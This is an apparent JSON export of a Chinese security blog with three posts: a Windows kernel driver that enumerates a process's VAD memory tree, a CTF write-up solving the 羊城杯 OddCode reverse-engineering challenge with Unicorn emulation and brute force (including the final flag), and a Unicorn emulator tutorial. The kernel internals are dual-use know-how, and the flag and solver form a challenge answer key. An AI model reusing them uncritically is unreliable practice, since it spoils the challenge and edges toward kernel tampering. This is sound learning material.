{"meta":{"title":"Airshelf's Blog","subtitle":"","description":"","author":"Airshelf","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"内核枚举进程内存属性","slug":"VADList","date":"2021-11-10T02:48:07.000Z","updated":"2021-11-10T02:51:10.544Z","comments":true,"path":"2021/11/10/VADList/","link":"","permalink":"http://example.com/2021/11/10/VADList/","excerpt":"","text":"通过遍历VadRoot结构，可以得到一个进程所持有的虚拟内存信息 #include &lt;ntifs.h> struct _MMVAD_FLAGS2 { ULONG FileOffset : 24; //0x0 ULONG SecNoChange : 1; //0x0 ULONG OneSecured : 1; //0x0 ULONG MultipleSecured : 1; //0x0 ULONG Spare : 1; //0x0 ULONG LongVad : 1; //0x0 ULONG ExtendableFile : 1; //0x0 ULONG Inherit : 1; //0x0 ULONG CopyOnWrite : 1; //0x0 }; struct _MMVAD_FLAGS3 { ULONG PreferredNode : 6; //0x0 ULONG Teb : 1; //0x0 ULONG Spare : 1; //0x0 ULONG SequentialAccess : 1; //0x0 ULONG LastSequentialTrim : 15; //0x0 ULONG Spare2 : 8; //0x0 }; struct _EX_PUSH_LOCK { union { struct { ULONG Locked : 1; //0x0 ULONG Waiting : 1; //0x0 ULONG Waking : 1; //0x0 ULONG MultipleShared : 1; //0x0 ULONG Shared : 28; //0x0 }; ULONG Value; //0x0 VOID* Ptr; //0x0 }; }; struct _MMVAD_FLAGS { ULONG CommitCharge : 19; //0x0 ULONG NoChange : 1; //0x0 ULONG VadType : 3; //0x0 ULONG MemCommit : 1; //0x0 ULONG Protection : 5; //0x0 ULONG Spare : 2; //0x0 ULONG PrivateMemory : 1; //0x0 }; typedef struct _MMVAD { union { LONG Balance : 2; //0x0 struct _MMVAD* Parent; //0x0 } u1; //0x0 struct _MMVAD* LeftChild; //0x4 struct _MMVAD* RightChild; //0x8 ULONG StartingVpn; //0xc ULONG EndingVpn; //0x10 union { ULONG LongFlags; //0x14 struct _MMVAD_FLAGS VadFlags; //0x14 } u; //0x14 struct _EX_PUSH_LOCK PushLock; //0x18 union { ULONG LongFlags3; //0x1c struct _MMVAD_FLAGS3 VadFlags3; //0x1c } u5; //0x1c union { ULONG LongFlags2; //0x20 struct _MMVAD_FLAGS2 VadFlags2; //0x20 } u2; //0x20 union { struct _SUBSECTION* Subsection; //0x24 struct _MSUBSECTION* MappedSubsection; //0x24 }; struct _MMPTE* FirstPrototypePte; //0x28 struct _MMPTE* LastContiguousPte; //0x2c struct _LIST_ENTRY ViewLinks; //0x30 struct _EPROCESS* VadsProcess; //0x38 }MMVAD,*PMMVAD; NTKERNELAPI UCHAR* PsGetProcessImageFileName(__in PEPROCESS Process); VOID EnumVAD(PMMVAD VADAddress,ULONG Level) { char* ProtectionType = NULL; if (VADAddress) { if (VADAddress->LeftChild) { EnumVAD(VADAddress->LeftChild, Level + 1); } switch (VADAddress->u.VadFlags.Protection) { case 1: ProtectionType = \"READONLY\"; break; case 2: ProtectionType = \"EXECUTE\"; break; case 3: ProtectionType = \"EXECUTE_READ\"; break; case 4: ProtectionType = \"READWRITE\"; break; case 5: ProtectionType = \"WRITECOPY\"; break; case 6: ProtectionType = \"EXECUTE_READWRITE\"; break; case 7: ProtectionType = \"EXECUTE_WRITECOPY\"; break; default: ProtectionType = \"NO_ACCESS\"; break; } KdPrintEx((77, 0, \"[+] VADNodeAddress:0x%x\\tLevel:%d\\tStartingVpn 0x%x\\t EndingVpn 0x%x\\tCommit %d\\tProtect:%s\\t%s\\r\\n\",VADAddress, Level, VADAddress->StartingVpn, VADAddress->EndingVpn, VADAddress->u.VadFlags.CommitCharge, ProtectionType, VADAddress->u.VadFlags.PrivateMemory?\"Private\":\"Mapped\")); if (VADAddress->RightChild) { EnumVAD(VADAddress->RightChild, Level + 1); } } } PEPROCESS FindProcessByName(char* Name) { PEPROCESS findProcess = NULL; for (int i = 4; i &lt; 0x1000000; i += 4) { PEPROCESS Process = NULL; NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;Process); if (!NT_SUCCESS(status)) { continue; } PUCHAR processname = PsGetProcessImageFileName(Process); if (processname &amp;&amp; _stricmp(processname, Name) == 0) { findProcess = Process; break; } ObDereferenceObject(Process); } return findProcess; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { KdPrintEx((77, 0, \"[+] Driver Unload\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); pDriver->DriverUnload = DrivUnload; PEPROCESS TargetProcess = FindProcessByName(\"notepad.exe\"); KdPrintEx((77, 0, \"[+] TargetProcess: 0x%x\\r\\n\", TargetProcess)); KdPrintEx((77, 0, \"[+] Driver Loaded\\r\\n\", pReg)); if (!TargetProcess) return STATUS_UNSUCCESSFUL; ULONG VadRoot = *(ULONG*)((ULONG)TargetProcess + 0x278); EnumVAD(VadRoot, 0); return STATUS_SUCCESS; } 效果如图：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"CTF-羊城杯-OddCode WP","slug":"ReOddCode","date":"2021-10-28T05:42:04.000Z","updated":"2021-10-29T05:16:33.659Z","comments":true,"path":"2021/10/28/ReOddCode/","link":"","permalink":"http://example.com/2021/10/28/ReOddCode/","excerpt":"","text":"基本信息观察首先确定，基本上是汇编直接写的题目，32位程序 IDA分析.text:0040526C public start .text:0040526C start: .text:0040526C 51 push ecx .text:0040526D 68 00 70 40 00 push offset aInputYourFlagH ; &quot;Input your flag here:\\r\\n&quot; .text:00405272 FF 15 0C 60 40 00 call ds:printf .text:00405278 83 C4 04 add esp, 4 .text:0040527B 68 1D 70 40 00 push offset byte_40701D .text:00405280 68 18 70 40 00 push offset a46s ; &quot;%46s&quot; .text:00405285 FF 15 08 60 40 00 call ds:scanf ; scanf(&quot;%46s&quot;,&amp;byte_40701D); .text:0040528B 83 C4 08 add esp, 8 .text:0040528E 33 C0 xor eax, eax .text:00405290 B3 2D mov bl, 2Dh ; &#39;-&#39; .text:00405292 80 3D 1D 70 40 00 53 cmp byte_40701D, 53h ; &#39;S&#39; .text:00405299 75 49 jnz short loc_4052E4 .text:0040529B 80 3D 1E 70 40 00 61 cmp byte_40701E, 61h ; &#39;a&#39; .text:004052A2 75 40 jnz short loc_4052E4 .text:004052A4 80 3D 1F 70 40 00 6E cmp byte_40701F, 6Eh ; &#39;n&#39; .text:004052AB 75 37 jnz short loc_4052E4 .text:004052AD 80 3D 20 70 40 00 67 cmp byte_407020, 67h ; &#39;g&#39; .text:004052B4 75 2E jnz short loc_4052E4 .text:004052B6 80 3D 21 70 40 00 46 cmp byte_407021, 46h ; &#39;F&#39; .text:004052BD 75 25 jnz short loc_4052E4 .text:004052BF 80 3D 22 70 40 00 6F cmp byte_407022, 6Fh ; &#39;o&#39; .text:004052C6 75 1C jnz short loc_4052E4 .text:004052C8 80 3D 23 70 40 00 72 cmp byte_407023, 72h ; &#39;r&#39; .text:004052CF 75 13 jnz short loc_4052E4 .text:004052D1 80 3D 24 70 40 00 7B cmp byte_407024, 7Bh ; &#39;&#123;&#39; .text:004052D8 75 0A jnz short loc_4052E4 .text:004052DA 80 3D 45 70 40 00 7D cmp byte_407045, 7Dh ; &#39;&#125;&#39; ; 检查字符串格式 .text:004052E1 75 01 jnz short loc_4052E4 ; 判断是否为SangFor&#123;......&#125;格式，长度为46 .text:004052E3 40 inc eax .text:004052E4 .text:004052E4 loc_4052E4: ; CODE XREF: .text:00405299↑j .text:004052E4 ; .text:004052A2↑j ... .text:004052E4 0B C0 or eax, eax .text:004052E6 75 15 jnz short loc_4052FD ; 符合格式则跳转这里 .text:004052E8 68 56 70 40 00 push offset aFail ; &quot;Fail.&quot; .text:004052ED FF 15 0C 60 40 00 call ds:printf .text:004052F3 83 C4 04 add esp, 4 .text:004052F6 6A 00 push 0 .text:004052F8 E8 03 BD FF FF call ExitProcess .text:004052FD ; --------------------------------------------------------------------------- .text:004052FD .text:004052FD loc_4052FD: ; CODE XREF: .text:004052E6↑j .text:004052FD 8D 3D 5C 70 40 00 lea edi, unk_40705C ; 符合格式则跳转这里 .text:00405303 8D 35 1D 70 40 00 lea esi, byte_40701D .text:00405309 EA 10 53 40 00 33 00 jmp far ptr dword_405640 值得注意的是最后一个jmp是长跳转，IDA分析出错 实际上是一个远跳转到33:405310这个地址 在Windows中，程序可以通过修改代码段寄存器切换32位模式和64位模式 当CS为0x33时，CPU按64位模式执行指令 当CS为0x23,时，CPU按32位模式执行指令 执行完这个远跳转后，程序跳转到405310这个地址（也就是下一条指令），CPU切换到64位模式执行，所以接下来的代码都要按64位模式解析。 编写Unicorn模拟执行64位代码 from unicorn import * from unicorn.x86_const import * from capstone import * ADDRESS = 0x401000 # 程序加载的地址 INPUT_ADDRESS = 0x40701D # 输入的地址 KEY_ADDRESS = 0x40705C # 16字节key的地址 with open('OddCode.exe', 'rb') as file: file.seek(0x400) X64_CODE = file.read(0x4269) # 读取代码 class Unidbg: def __init__(self,flag): mu = Uc(UC_ARCH_X86,UC_MODE_64) mu.mem_map(ADDRESS, 0x1000000) mu.mem_write(ADDRESS, X64_CODE) mu.mem_write(INPUT_ADDRESS, flag) mu.mem_write(KEY_ADDRESS, b'\\x90\\xF0\\x70\\x7C\\x52\\x05\\x91\\x90\\xAA\\xDA\\x8F\\xFA\\x7B\\xBC\\x79\\x4D') mu.reg_write(UC_X86_REG_RAX, 1) mu.reg_write(UC_X86_REG_RBX, 0x010B602D) mu.reg_write(UC_X86_REG_RCX, 0xEEFD0A44) mu.reg_write(UC_X86_REG_RDX, 0x0038701C) mu.reg_write(UC_X86_REG_RSI, INPUT_ADDRESS) # input参数 mu.reg_write(UC_X86_REG_RDI, KEY_ADDRESS) # key参数 mu.reg_write(UC_X86_REG_RBP, 0x012FFE1C) mu.reg_write(UC_X86_REG_RSP, 0x012FFE0C) mu.reg_write(UC_X86_REG_RIP, 0x401010) mu.hook_add(UC_HOOK_CODE, self.trace) # hook代码执行，保存代码块执行轨迹 self.mu = mu self.except_addr = 0 self.traces = [] # 用来保存代码块执行轨迹 def trace(self, mu, address, size, data): if address != self.except_addr: self.traces.append(address) self.except_addr = address + size def start(self): try: self.mu.emu_start(0x401010, -1) except: pass print([hex(addr)for addr in self.traces]) Unidbg(b'SangFor{00000000000000000000000000000000}').start() Unicorn可以hook代码块执行，但是会被花指令干扰， 所以这里通过hook指令执行，然后通过 if(当前的地址是否==上次执行的地址+上一条指令的长度)来判断是否发生了代码块跳转 执行结果如下： [&#39;0x401010&#39;, &#39;0x403634&#39;, &#39;0x403e1d&#39;, &#39;0x40389c&#39;, &#39;0x403d9e&#39;, &#39;0x403b8e&#39;, &#39;0x4037ae&#39;, &#39;0x403f3a&#39;, &#39;0x404ee5&#39;, &#39;0x4051ad&#39;, &#39;0x4045f9&#39;, &#39;0x404e03&#39;, &#39;0x403c8f&#39;, &#39;0x404cf1&#39;, &#39;0x404e96&#39;, &#39;0x403d49&#39;, &#39;0x403641&#39;, &#39;0x404ca8&#39;, &#39;0x4049fd&#39;, &#39;0x405109&#39;, &#39;0x404e16&#39;, &#39;0x40382a&#39;, &#39;0x4048f1&#39;, &#39;0x403ec2&#39;, &#39;0x404567&#39;, &#39;0x403a7e&#39;, &#39;0x404ae0&#39;, &#39;0x403718&#39;, &#39;0x40402f&#39;, &#39;0x404ba1&#39;, &#39;0x404263&#39;, &#39;0x404441&#39;, &#39;0x404af2&#39;, &#39;0x4042f7&#39;, &#39;0x405163&#39;, &#39;0x403dd1&#39;, &#39;0x4049b7&#39;, &#39;0x404907&#39;, &#39;0x404ddb&#39;, &#39;0x402896&#39;, &#39;0x402e08&#39;, &#39;0x4035a4&#39;, &#39;0x402bd2&#39;, &#39;0x4032a2&#39;, &#39;0x402cf2&#39;, &#39;0x40296d&#39;, &#39;0x402eb6&#39;, &#39;0x403391&#39;, &#39;0x402f9b&#39;, &#39;0x402ff8&#39;, &#39;0x402b83&#39;, &#39;0x403082&#39;, &#39;0x402ab3&#39;, &#39;0x40333e&#39;, &#39;0x402ee9&#39;, &#39;0x402bc5&#39;, &#39;0x403519&#39;, &#39;0x403447&#39;, &#39;0x4031a1&#39;, &#39;0x4033fa&#39;, &#39;0x402bba&#39;, &#39;0x403623&#39;, &#39;0x402b95&#39;, &#39;0x402e99&#39;, &#39;0x40308d&#39;, &#39;0x4033a0&#39;, &#39;0x403473&#39;, &#39;0x4035ac&#39;, &#39;0x402b21&#39;, &#39;0x402980&#39;, &#39;0x40341d&#39;, &#39;0x4031d4&#39;, &#39;0x4032ab&#39;, &#39;0x4030e2&#39;, &#39;0x40289c&#39;, &#39;0x402acb&#39;, &#39;0x4030f4&#39;, &#39;0x4034f8&#39;, &#39;0x403176&#39;, &#39;0x402e5d&#39;, &#39;0x402cfe&#39;, &#39;0x402bfb&#39;, &#39;0x402f15&#39;, &#39;0x402c6e&#39;, &#39;0x402ea5&#39;, &#39;0x40305d&#39;, &#39;0x402f91&#39;, &#39;0x403267&#39;, &#39;0x403210&#39;, &#39;0x40324a&#39;, &#39;0x40330f&#39;, &#39;0x4032d9&#39;, &#39;0x402e78&#39;, &#39;0x402924&#39;, &#39;0x4034d5&#39;, &#39;0x402c19&#39;, &#39;0x403121&#39;, &#39;0x402907&#39;, &#39;0x402a75&#39;, &#39;0x40332e&#39;, &#39;0x402dc9&#39;, &#39;0x402edc&#39;, &#39;0x40353d&#39;, &#39;0x402c2f&#39;, &#39;0x402cd4&#39;, &#39;0x4028e4&#39;, &#39;0x402b6c&#39;, &#39;0x403481&#39;, &#39;0x40294b&#39;, &#39;0x402b40&#39;, &#39;0x402e83&#39;, &#39;0x402f4d&#39;, &#39;0x4031f8&#39;, &#39;0x404df6&#39;, &#39;0x404177&#39;, &#39;0x40496d&#39;, &#39;0x4037a1&#39;, &#39;0x403a3a&#39;, &#39;0x404d76&#39;, &#39;0x403e38&#39;, &#39;0x4045bc&#39;, &#39;0x403f86&#39;, &#39;0x403df5&#39;, &#39;0x404242&#39;, &#39;0x403aee&#39;, &#39;0x405039&#39;, &#39;0x403ff8&#39;, &#39;0x404cb9&#39;, &#39;0x4048a1&#39;, &#39;0x404135&#39;, &#39;0x403d05&#39;, &#39;0x404bd9&#39;, &#39;0x403c0e&#39;, &#39;0x405133&#39;, &#39;0x4042d7&#39;, &#39;0x404bff&#39;, &#39;0x4039fe&#39;, &#39;0x4050a8&#39;, &#39;0x404a2f&#39;, &#39;0x404e6a&#39;, &#39;0x4043f6&#39;, &#39;0x40401d&#39;, &#39;0x4043a1&#39;, &#39;0x404b95&#39;, &#39;0x4037d5&#39;, &#39;0x40404d&#39;, &#39;0x4037c6&#39;, &#39;0x4046b3&#39;, &#39;0x405120&#39;, &#39;0x405013&#39;, &#39;0x405075&#39;, &#39;0x404673&#39;, &#39;0x4045e1&#39;, &#39;0x403ba2&#39;, &#39;0x404802&#39;, &#39;0x40481c&#39;, &#39;0x4038d6&#39;, &#39;0x404f11&#39;, &#39;0x404494&#39;, &#39;0x4041f1&#39;, &#39;0x403853&#39;, &#39;0x40504d&#39;, &#39;0x404529&#39;, &#39;0x4050df&#39;, &#39;0x403671&#39;, &#39;0x403968&#39;, &#39;0x403741&#39;, &#39;0x404074&#39;, &#39;0x40368e&#39;, &#39;0x404ffb&#39;, &#39;0x404c86&#39;, &#39;0x40491f&#39;, &#39;0x40432b&#39;, &#39;0x403e8c&#39;, &#39;0x403f97&#39;, &#39;0x4038e5&#39;, &#39;0x4044bc&#39;, &#39;0x40444e&#39;, &#39;0x403a48&#39;, &#39;0x4039c9&#39;, &#39;0x4046d2&#39;, &#39;0x403982&#39;, &#39;0x403eed&#39;, &#39;0x404682&#39;, &#39;0x403d7c&#39;, &#39;0x403eb6&#39;, &#39;0x403c25&#39;, &#39;0x404390&#39;, &#39;0x40462c&#39;, &#39;0x404957&#39;, &#39;0x404a0c&#39;, &#39;0x40486e&#39;, &#39;0x40493b&#39;, &#39;0x404479&#39;, &#39;0x404760&#39;, &#39;0x404ed5&#39;, &#39;0x404eb6&#39;, &#39;0x404d52&#39;, &#39;0x4039a8&#39;, &#39;0x4041bb&#39;, &#39;0x404e48&#39;, &#39;0x4039b4&#39;, &#39;0x40513e&#39;, &#39;0x4041a4&#39;, &#39;0x40473a&#39;, &#39;0x404abe&#39;, &#39;0x4047d8&#39;, &#39;0x404650&#39;, &#39;0x4051b7&#39;, &#39;0x404367&#39;, &#39;0x403b75&#39;, &#39;0x403c63&#39;, &#39;0x404542&#39;, &#39;0x40487f&#39;, &#39;0x404b79&#39;, &#39;0x404ccc&#39;, &#39;0x403cc8&#39;, &#39;0x404d28&#39;, &#39;0x4036f1&#39;, &#39;0x404a7b&#39;, &#39;0x403cd3&#39;, &#39;0x403e98&#39;, &#39;0x404f28&#39;, &#39;0x403847&#39;, &#39;0x4038ac&#39;, &#39;0x40365c&#39;, &#39;0x40454f&#39;, &#39;0x403944&#39;, &#39;0x404105&#39;, &#39;0x404506&#39;, &#39;0x404bb6&#39;, &#39;0x403893&#39;, &#39;0x404c71&#39;, &#39;0x403839&#39;, &#39;0x404f3b&#39;, &#39;0x403bca&#39;, &#39;0x403795&#39;, &#39;0x403b16&#39;, &#39;0x4040c9&#39;, &#39;0x403d3c&#39;, &#39;0x403afe&#39;, &#39;0x405230&#39;, &#39;0x40419c&#39;] 跳转过多。。。所以我们加一点约束条件，对模拟内存访问进行HOOK mu.hook_add(UC_HOOK_MEM_READ, self.hook_mem_read) # hook 内存读取 def hook_mem_read(self, mu, access, address, size, value, data): if address >= INPUT_ADDRESS and address &lt;= INPUT_ADDRESS + 41: print(f'Read input[{address - INPUT_ADDRESS}] at {hex(mu.reg_read(UC_X86_REG_RIP))}') if address >= KEY_ADDRESS and address &lt;= KEY_ADDRESS + 16: print(f'Read key[{address - KEY_ADDRESS}] at {hex(mu.reg_read(UC_X86_REG_RIP))}') Read input[8] at 0x40326d Read input[8] at 0x403214 Read input[8] at 0x403219 Read input[9] at 0x40324a Read input[9] at 0x403254 Read input[9] at 0x40325e Read key[0] at 0x403a3e 对上述HOOK结果进行分析，不难得出：(1)输入可能是两个字节一组进行判断(2)校验不通过不会进行余下的字符串检查(3)读取输入的代码地址(4)读取Key的代码地址 接下来IDA分析 分别观察代码块 0x40326d -&gt; 0x266D 0x403214 -&gt; 0x2614 0x40324a -&gt; 0x264a 至此大概明白了对于数字输入的检查方法 if(input[i] >= '0' &amp;&amp; input[i] &lt;= '9' &amp;&amp; input[i+1] >= '0' &amp;&amp; input[i+1] &lt;= '9' ) { al = input[i] - '0'; bl = input[i] - '0'; } 接下来看一看key的部分 继续跟下去 发现跟到这里断了。。无奈之下，我们需要找到读取key之后的判断方法 我们再修改一下trace函数，通过capstone反汇编引擎找到执行到的cmp指令和test指令的地址 def trace(self, mu, address, size, data): disasm = self.md.disasm(mu.mem_read(address, size), address) for i in disasm: mnemonic = i.mnemonic if mnemonic == 'cmp' or mnemonic == 'test': print(f'Instruction {mnemonic} at {hex(address)} offset: {hex(address - ADDRESS + 0x400)}') if address != self.except_addr: self.traces.append(address) self.except_addr = address + size 得到输出 Instruction cmp at 0x403ca1 offset: 0x30a1 Instruction cmp at 0x404de8 offset: 0x41e8 Instruction cmp at 0x40326d offset: 0x266d Read input[8] at 0x40326d Instruction cmp at 0x403214 offset: 0x2614 Read input[8] at 0x403214 Read input[8] at 0x403219 Instruction cmp at 0x40324a offset: 0x264a Read input[9] at 0x40324a Instruction cmp at 0x403254 offset: 0x2654 Read input[9] at 0x403254 Read input[9] at 0x40325e Instruction test at 0x404177 offset: 0x3577 Read key[0] at 0x403a3e Instruction cmp at 0x4038e7 offset: 0x2ce7 可以得出，key之后的比较，只有0x4038e7一处 而FLAG校验为2个字节一组，是可以爆破的。 所以只需要记录正确执行到0x4038ef的字符串就可以。 爆破完整脚本： from array import array import capstone from unicorn import * from unicorn.x86_const import * from capstone import * ADDRESS = 0x401000 # 程序加载的地址 INPUT_ADDRESS = 0x40701D # 输入的地址 KEY_ADDRESS = 0x40705C # 16字节key的地址 with open('OddCode.exe', 'rb') as file: file.seek(0x400) X64_CODE = file.read(0x4269) # 读取代码 class Unidbg: def __init__(self,flag,Allhit): mu = Uc(UC_ARCH_X86,UC_MODE_64) mu.mem_map(ADDRESS, 0x1000000) mu.mem_write(ADDRESS, X64_CODE) mu.mem_write(INPUT_ADDRESS, flag) mu.mem_write(KEY_ADDRESS, b'\\x90\\xF0\\x70\\x7C\\x52\\x05\\x91\\x90\\xAA\\xDA\\x8F\\xFA\\x7B\\xBC\\x79\\x4D') mu.reg_write(UC_X86_REG_RAX, 1) mu.reg_write(UC_X86_REG_RBX, 0x010B602D) mu.reg_write(UC_X86_REG_RCX, 0xEEFD0A44) mu.reg_write(UC_X86_REG_RDX, 0x0038701C) mu.reg_write(UC_X86_REG_RSI, INPUT_ADDRESS) # input参数 mu.reg_write(UC_X86_REG_RDI, KEY_ADDRESS) # key参数 mu.reg_write(UC_X86_REG_RBP, 0x012FFE1C) mu.reg_write(UC_X86_REG_RSP, 0x012FFE0C) mu.reg_write(UC_X86_REG_RIP, 0x401010) mu.hook_add(UC_HOOK_CODE, self.trace) # hook代码执行，保存代码块执行轨迹 #mu.hook_add(UC_HOOK_MEM_READ, self.hook_mem_read) # hook 内存读取 self.mu = mu self.except_addr = 0 self.traces = [] # 用来保存代码块执行轨迹 self.md = Cs(CS_ARCH_X86, CS_MODE_64) self.isSuccess = False self.hit = 0 self.Allhit = Allhit def trace(self, mu, address, size, data): # disasm = self.md.disasm(mu.mem_read(address, size), address) # for i in disasm: # mnemonic = i.mnemonic # if mnemonic == 'cmp' or mnemonic == 'test': # print(f'Instruction {mnemonic} at {hex(address)} offset: {hex(address - ADDRESS + 0x400)}') # if address != self.except_addr: # self.traces.append(address - ADDRESS + 0x400) # self.except_addr = address + size if address == 0x4038ef: self.hit += 1 if(self.hit == self.Allhit): self.isSuccess = True mu.emu_stop() def hook_mem_read(self, mu, access, address, size, value, data): if address >= INPUT_ADDRESS and address &lt;= INPUT_ADDRESS + 41: print(f'Read input[{address - INPUT_ADDRESS}] at {hex(mu.reg_read(UC_X86_REG_RIP))}') if address >= KEY_ADDRESS and address &lt;= KEY_ADDRESS + 16: print(f'Read key[{address - KEY_ADDRESS}] at {hex(mu.reg_read(UC_X86_REG_RIP))}') def start(self): try: self.mu.emu_start(0x401010, -1) except: pass #print([hex(addr)for addr in self.traces]) return self.isSuccess def get_flag(flag, except_hit): for i in b'1234567890abcdefABCDEF': for j in b'1234567890abcdefABCDEF': flag[8 + (except_hit - 1) * 2] = i flag[8 + (except_hit - 1) * 2 + 1] = j if Unidbg(bytes(flag), except_hit).start(): return flag = bytearray(b'SangFor{00000000000000000000000000000000}') for i in range(1, 17): get_flag(flag, i) print(flag.decode()) # Unidbg(b'SangFor{00000000000000000000000000000000}').start() #SangFor{00000000000000000000000000000000} 爆破输出: SangFor&#123;A7000000000000000000000000000000&#125; SangFor&#123;A7A40000000000000000000000000000&#125; SangFor&#123;A7A4A000000000000000000000000000&#125; SangFor&#123;A7A4A0C0000000000000000000000000&#125; SangFor&#123;A7A4A0C0B10000000000000000000000&#125; SangFor&#123;A7A4A0C0B10B00000000000000000000&#125; SangFor&#123;A7A4A0C0B10Baf000000000000000000&#125; SangFor&#123;A7A4A0C0B10Bafa70000000000000000&#125; SangFor&#123;A7A4A0C0B10Bafa77600000000000000&#125; SangFor&#123;A7A4A0C0B10Bafa776F5000000000000&#125; SangFor&#123;A7A4A0C0B10Bafa776F55F0000000000&#125; SangFor&#123;A7A4A0C0B10Bafa776F55FF400000000&#125; SangFor&#123;A7A4A0C0B10Bafa776F55FF4F8000000&#125; SangFor&#123;A7A4A0C0B10Bafa776F55FF4F8C60000&#125; SangFor&#123;A7A4A0C0B10Bafa776F55FF4F8C6E800&#125; SangFor&#123;A7A4A0C0B10Bafa776F55FF4F8C6E849&#125;","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"逆向","slug":"逆向","permalink":"http://example.com/tags/%E9%80%86%E5%90%91/"}]},{"title":"unicorn学习记录","slug":"Unicorn1","date":"2021-10-27T02:34:54.000Z","updated":"2021-10-28T03:15:27.128Z","comments":true,"path":"2021/10/27/Unicorn1/","link":"","permalink":"http://example.com/2021/10/27/Unicorn1/","excerpt":"","text":"unicorn简介Unicorn 是一个轻量级, 多平台, 多架构的 CPU 模拟器框架. 我们可以更好地关注 CPU 操作, 忽略机器设备的差异. 想象一下, 我们可以将其应用于这些情景: 比如我们单纯只是需要模拟代码的执行而非需要一个真的 CPU 去完成那些操作, 又或者想要更安全地 分析恶意代码, 检测病毒特征, 或者想要在逆向过程中验证某些代码的含义. 使用 CPU 模拟器可以很好 地帮助我们提供便捷. 它的亮点 (这也归功于 Unicorn 是基于 qemu 而开发的) 包括: 支持多种架构: Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64). 对 Windows 和 nix 系统 (已确认包含 Mac OSX, Linux, BSD &amp; Solaris) 的原生支持 具有平台独立且简洁易于使用的 API 使用 JIT 编译技术, 性能表现优异 应用场景调用恶意软件中一些有趣的函数, 而不用创建一个有害的进程 用于 CTF 竞赛 用于模糊测试 用于 gdb 插件, 基于代码模拟执行的插件 模拟执行一些混淆代码 python用法# -*- coding: utf-8 -*- from unicorn import * from unicorn.x86_const import * # 需要使用一些x86常量, import一下 X86_CODE32 = b\"\\x41\\x4a\" # 这是我们要模拟的代码，这里使用16进制表示，表示两个x86指令“INC ecx”和”DEC dex“ Address = 0x1000000 # 指定虚拟地址，我们将在这儿模拟上述代码 mu = Uc(UC_ARCH_X86, UC_MODE_32) # 使用Uc类初始化Unicorn, 该类接受2个参数：硬件架构和硬件模式。 在这里，我们希望模拟X86体系结构的32位代码 mu.mem_map(Address, 2*1024*1024) # 使用mem_map方法在前面声明的地址处映射2MB内存。此过程中的所有CPU操作都只能访问此内存。 此内存使用默认权限READ，WRITE和EXECUTE进行映射 mu.mem_write(Address, X86_CODE32) # 将要模拟的代码写入我们刚刚映射到的内存中。 mem_write方法有两个参数：要写入的地址和要写入内存的代码 mu.reg_write(UC_X86_REG_ECX, 0X1234) mu.reg_write(UC_X86_REG_EDX, 0X7890) # 使用reg_write方法设置ECX,EDX寄存器的值 mu.emu_start(Address, Address+len(X86_CODE32)) # 使用emu_start方法开始模拟。该API采用4个参数:需要模拟的代码的地址、模拟停止的地址(正好在X86_CODE32的最后一个字节之后)、要模拟的时间和要模拟的指令数量。如果我们忽略最后两个参数，比如这个例子，unicorn将在无限时间和无限数量的指令中模拟代码 r_ecx = mu.reg_read(UC_X86_REG_ECX) r_edx = mu.reg_read(UC_X86_REG_EDX) # 通过reg_read函数读取 print(\">> ecx = 0x%x\" % r_ecx) print(\">> edx = 0x%x\" % r_edx) # 打印出寄存器ECX,EDX的值 C用法#include &lt;unicorn/unicorn.h> #include &lt;stdio.h> #define X86_CODE32 \"\\x41\\x4a\" //INC ecx; DEC edx #define ADDRESS 0x1000000 //定义一个虚拟地址,我们将在这里模拟上述代码 //memory address where emulation starts int main(int argc, char **argv, char **envp) { uc_engine *uc; uc_err err; int r_ecx = 0x1234; // ECX register int r_edx = 0x7890; // EDX register printf(\"Emulate i386 code\\n\"); err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc); //以X86_32的模式初始化 if (err != UC_ERR_OK) { printf(\"Failed on uc_open() with error returned: %u\\n\", err); return -1; } uc_mem_map(uc, ADDRESS, 2 * 1024 * 1024, UC_PROT_ALL); //在对应地址出映射2M的内存 // write machine code to be emulated to memory if (uc_mem_write(uc, ADDRESS, X86_CODE32, sizeof(X86_CODE32) - 1)){ printf(\"Failed to write emulation code to memory, quit!\\n\"); return -1; } uc_reg_write(uc, UC_X86_REG_ECX, &amp;r_ecx); uc_reg_write(uc, UC_X86_REG_EDX, &amp;r_edx); //初始话寄存器的值 //最后两个参数没有指定,在无限时间和无限指令中模拟代码 err=uc_emu_start(uc, ADDRESS, ADDRESS + sizeof(X86_CODE32) - 1, 0, 0); if (err){ printf(\"Failed on uc_emu_start() with error returned %u: %s\\n\", err, uc_strerror(err)); } // now print out some registers printf(\"Emulation done. Below is the CPU context\\n\"); uc_reg_read(uc, UC_X86_REG_ECX, &amp;r_ecx); uc_reg_read(uc, UC_X86_REG_EDX, &amp;r_edx); printf(\">>> ECX = 0x%x\\n\", r_ecx); printf(\">>> EDX = 0x%x\\n\", r_edx); uc_close(uc); return 0; } 编译 gcc test.c -o test -lunicorn -lpthread 虚拟内存Unicorn 采用虚拟内存机制，使得虚拟CPU的内存与真实CPU的内存隔离。Unicorn 使用如下API来操作内存: uc_mem_map uc_mem_read uc_mem_write 使用uc_mem_map映射内存的时候，address 与 size 都需要与0x1000对齐，也就是0x1000的整数倍，否则会报UC_ERR_ARG 异常。 Hook机制#指令执行类 UC_HOOK_INTR UC_HOOK_INSN UC_HOOK_CODE UC_HOOK_BLOCK #内存访问类 UC_HOOK_MEM_READ UC_HOOK_MEM_WRITE UC_HOOK_MEM_FETCH UC_HOOK_MEM_READ_AFTER UC_HOOK_MEM_PROT UC_HOOK_MEM_FETCH_INVALID UC_HOOK_MEM_INVALID UC_HOOK_MEM_VALID #异常处理类 UC_HOOK_MEM_READ_UNMAPPED UC_HOOK_MEM_WRITE_UNMAPPED UC_HOOK_MEM_FETCH_UNMAPPED 调用hook_add函数可添加一个Hook。 Unicorn的Hook是链式的，而不是传统Hook的覆盖式，也就是说，可以同时添加多个同类型的Hook，Unicorn会依次调用每一个handler。 hook callback 